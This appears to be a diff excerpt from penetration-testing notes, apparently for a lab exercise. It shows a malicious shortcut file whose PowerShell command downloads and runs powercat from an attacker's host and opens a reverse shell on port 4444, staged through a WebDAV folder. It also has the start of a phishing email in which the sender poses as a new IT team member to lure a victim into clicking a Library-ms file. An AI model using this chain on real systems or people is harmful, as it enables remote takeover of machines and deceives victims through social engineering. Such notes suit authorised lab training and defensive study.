@@ -47,7 +47,7 @@ Create .Ink shotcut file with command:
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
 Save as automatic_configuration,put it in Lhost's webdav folder
 
-Delivery via email:
+Delivery config.Library-ms via email for triggering victim to click short link:
 Hello! My name is Dwight, and I'm a new member of the IT Team.
 
 This week I am completing some configurations we rolled out last week.
